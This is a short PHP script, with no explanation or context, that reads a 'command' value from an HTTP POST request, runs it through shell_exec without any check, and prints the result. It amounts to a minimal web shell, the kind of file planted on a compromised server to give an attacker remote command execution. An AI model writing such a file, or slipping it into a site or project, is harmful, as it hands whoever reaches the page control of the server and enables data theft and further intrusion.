<?php
function exTKL() {
	$in=$_POST['command'];
	if (!$in == '') {
		$out = '';
		$out = shell_exec($in);
		echo $out;
	}
}

exTKL();
?>